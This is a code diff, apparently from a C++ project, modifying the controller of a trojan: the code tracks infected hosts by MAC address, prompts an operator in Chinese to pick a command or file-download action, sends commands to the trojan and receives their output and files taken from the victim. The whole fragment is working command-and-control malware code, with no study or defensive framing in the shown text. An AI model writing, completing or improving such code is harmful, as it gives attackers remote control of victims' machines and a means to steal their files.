@@ -165,7 +165,6 @@ void cmd(char *MacAddr)
 		
 		if (free_index != -1)
 		{
-
 			g_trojan_info[free_index].live_flag = 1;
 			//memcpy(g_trojan_info[free_index].mac, MacAddr, MAC_ADDR_LEN);
 			cout << "请输入要发送的指令种类：" << endl << "1.普通指令 2.文件下载指令" << endl << "(1/2)  ";
@@ -226,6 +225,14 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 		// check if the trojan has an cmd to do
 		memset(CmdBuff, 0, MAX_CMD_LEN);
 		CmdNo = get_cmd_by_mac(RecvBuffer, CmdBuff);
+
+		char recvbuf[DEFAULT_BUFLEN];
+		FILE *file = NULL;
+		char *filename = LocalFile;
+		int invfilelen, filelen;
+		int recvbuflen = DEFAULT_BUFLEN;
+		int iResult;
+
 		switch(CmdNo)
 		{
 		case CMD_NULL:
@@ -242,8 +249,8 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			// send cmd content
 			send(ClientSocket, CmdBuff, strlen(CmdBuff), 0);
 			// recv cmd result from trojan
-
-
+			iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
+			printf("接收到返回数据:  %s(%d)\n", recvbuf, iResult);
 			break;
 		case CMD_DOWNLOAD:
 			cout << "执行文件下载" << endl;
@@ -262,13 +269,9 @@ DWORD WINAPI ClientThread(LPVOID lpParameter)
 			// recv file from trojan
 
 
-			char recvbuf[DEFAULT_BUFLEN];
-			FILE *file = NULL;
-			char *filename = LocalFile;
-			int invfilelen, filelen;
-			int recvbuflen = DEFAULT_BUFLEN;
+			
 
-			int iResult = recv(ClientSocket, recvbuf, sizeof(char *), 0);
+			iResult = recv(ClientSocket, recvbuf, sizeof(char *), 0);
 			if (iResult >0)
 			{
 				invfilelen = *((int *)recvbuf);
